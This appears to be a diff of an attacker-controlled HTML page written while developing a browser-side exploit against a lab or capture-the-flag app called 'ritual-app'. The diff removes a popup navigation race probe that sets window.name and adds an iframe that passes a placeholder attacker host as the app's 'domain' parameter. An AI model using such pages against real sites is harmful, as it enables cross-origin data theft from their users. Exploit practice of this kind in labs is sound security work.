@@ -1,54 +1,6 @@
 <!doctype html>
 <html>
 <body>
-<script>
-console.log("RACE30-NEW-CODE-OK", Date.now());
-
-const w = window.open("about:blank");
-console.log("popup opened", !!w, Date.now());
-
-if (w) {
-  try {
-    w.document.write(`
-      <script>
-        console.log("CHILD-ABOUT-BLANK-OK", Date.now());
-        window.name = "ghost_" + Math.random().toString(36).slice(2);
-        console.log("CHILD-NAME", window.name, Date.now());
-      <\/script>
-    `);
-    console.log("WRITE-OK", Date.now());
-  } catch (e) {
-    console.log("WRITE-FAIL", e.message);
-  }
-
-  [
-    "http://ritual-app:5000/",
-    "about:blank",
-    "http://ritual-app:5000/",
-    "about:blank",
-    "http://ritual-app:5000/"
-  ].forEach((u, i) => {
-    setTimeout(() => {
-      try {
-        w.location = u;
-        console.log("NAV", i, u, Date.now());
-      } catch (e) {
-        console.log("NAV-FAIL", i, e.message);
-      }
-    }, i);
-  });
-
-  let n = 0;
-  const t = setInterval(() => {
-    n++;
-    try {
-      console.log("TICK", n, "closed=", w.closed, Date.now());
-    } catch (e) {
-      console.log("TICK-FAIL", n, e.message);
-    }
-    if (n > 30) clearInterval(t);
-  }, 1);
-}
-</script>
+<iframe src="http://ritual-app:5000/?domain=http://TON_HOST_HTTP:8080"></iframe>
 </body>
 </html>
